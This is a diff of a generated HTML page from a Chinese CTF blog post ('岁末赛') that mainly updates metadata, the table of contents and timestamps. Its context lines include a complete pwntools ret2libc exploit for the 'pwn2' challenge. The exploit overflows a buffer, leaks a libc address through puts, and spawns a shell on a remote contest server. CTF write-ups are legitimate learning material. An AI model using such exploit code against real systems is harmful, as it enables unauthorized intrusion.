@@ -39,17 +39,17 @@
 
 
     
-    <meta name="description" content="pwn2from pwn import *# from LibcSearcher import *i&#x3D;remote(&#39;219.219.61.234&#39;,10001)#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)addr&#x3D;0x08048753sm&#x3D;elf.got[&#39;__libc_start_main&#39;]p_t&#x3D;elf.plt[&#39;puts&#39;]payload1&#x3D;&#39;\x00">
+    <meta name="description" content="岁末赛">
 <meta property="og:type" content="article">
 <meta property="og:title" content="岁末赛">
 <meta property="og:url" content="https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/index.html">
 <meta property="og:site_name" content="Mr.Guo">
-<meta property="og:description" content="pwn2from pwn import *# from LibcSearcher import *i&#x3D;remote(&#39;219.219.61.234&#39;,10001)#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)addr&#x3D;0x08048753sm&#x3D;elf.got[&#39;__libc_start_main&#39;]p_t&#x3D;elf.plt[&#39;puts&#39;]payload1&#x3D;&#39;\x00">
+<meta property="og:description" content="岁末赛">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/12/27/aEDdyTbFmQ46Wxw.png">
 <meta property="og:image" content="https://i.loli.net/2020/12/27/Q9CsiBqEcPeFYgJ.png">
 <meta property="article:published_time" content="2020-12-26T16:02:38.471Z">
-<meta property="article:modified_time" content="2021-01-05T11:25:27.312Z">
+<meta property="article:modified_time" content="2021-01-05T11:35:24.840Z">
 <meta property="article:author" content="Mr.Guo">
 <meta property="article:tag" content="RE">
 <meta name="twitter:card" content="summary">
@@ -199,13 +199,13 @@
     <aside class="post-widget">
         <nav class="post-toc-wrap" id="post-toc">
             <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn2"><span class="post-toc-number">1.</span> <span class="post-toc-text">pwn2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn3"><span class="post-toc-number">2.</span> <span class="post-toc-text">pwn3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn4"><span class="post-toc-number">3.</span> <span class="post-toc-text">pwn4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#zzzz3333333"><span class="post-toc-number">4.</span> <span class="post-toc-text">zzzz3333333</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#"><span class="post-toc-number">5.</span> <span class="post-toc-text">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#岁末赛"><span class="post-toc-number">1.</span> <span class="post-toc-text">岁末赛</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn2"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">pwn2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn3"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">pwn3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn4"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">pwn4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#zzzz3333333"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">zzzz3333333</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">
                 
                     
                     
                 
                 
-            </span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#名字没想好"><span class="post-toc-number">6.</span> <span class="post-toc-text">名字没想好</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Merry-Christmas"><span class="post-toc-number">7.</span> <span class="post-toc-text">Merry_Christmas</span></a></li></ol>
+            </span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#名字没想好"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">名字没想好</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Merry-Christmas"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">Merry_Christmas</span></a></li></ol></li></ol>
         </nav>
     </aside>
    
@@ -238,7 +238,7 @@
             阅读本文可能花费您&nbsp;<span class="post-count">13</span>&nbsp;分钟
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <a id="more"></a>
+            <h2 id="岁末赛"><a href="#岁末赛" class="headerlink" title="岁末赛"></a>岁末赛</h2><a id="more"></a>
 
 <h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">i=remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#sh=process('./pwn2')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">addr=<span class="number">0x08048753</span></span><br><span class="line">sm=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p_t=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'\x00'</span>*<span class="number">7</span> +<span class="string">'\xff'</span></span><br><span class="line">i.sendline(payload1)</span><br><span class="line">i.recvuntil(<span class="string">"you_really_know_random_haha\n"</span>)</span><br><span class="line"></span><br><span class="line">payload2=(<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(p_t)+p32(addr)+p32(sm)</span><br><span class="line">i.sendline(payload2)</span><br><span class="line">s_addr=u32(i.recv(<span class="number">4</span>))</span><br><span class="line">info(hex(s_addr))</span><br><span class="line"><span class="comment"># libc=LibcSearcher("__libc_start_main",s_addr)</span></span><br><span class="line">libc = ELF(<span class="string">'libc6-i386_2.23-0ubuntu11.2_amd64.so'</span>)</span><br><span class="line">A=s_addr-libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">info(hex(A))</span><br><span class="line">y_addr=A+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment"># binsh_addr=A+libc.dump('str_bin_sh')</span></span><br><span class="line">binsh_addr = A + <span class="number">0x15910b</span></span><br><span class="line"><span class="comment">#payload1='\x00'*7+'\xff'</span></span><br><span class="line"><span class="comment">#i.sendline(payload1)</span></span><br><span class="line"><span class="comment">#i.recvuntil("you_really_know_random_haha")</span></span><br><span class="line">payload2=(<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(y_addr)+p32(addr)+p32(binsh_addr)</span><br><span class="line">i.sendline(payload2)</span><br><span class="line">i.interactive()</span><br></pre></td></tr></table></figure></div>
 
@@ -279,7 +279,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2021-01-05T11:25:27.312Z" itemprop="dateUpdated">2021-01-05 19:25:27</time>
+    Last updated: <time datetime="2021-01-05T11:35:24.840Z" itemprop="dateUpdated">2021-01-05 19:35:24</time>
 </span>
 
 
@@ -326,7 +326,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/&title=《岁末赛》 — Mr.Guo&source=Myblog" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/&title=《岁末赛》 — Mr.Guo&source=岁末赛" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -512,7 +512,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/&title=《岁末赛》 — Mr.Guo&source=Myblog" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/12/27/%E5%B2%81%E6%9C%AB%E8%B5%9B/&title=《岁末赛》 — Mr.Guo&source=岁末赛" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
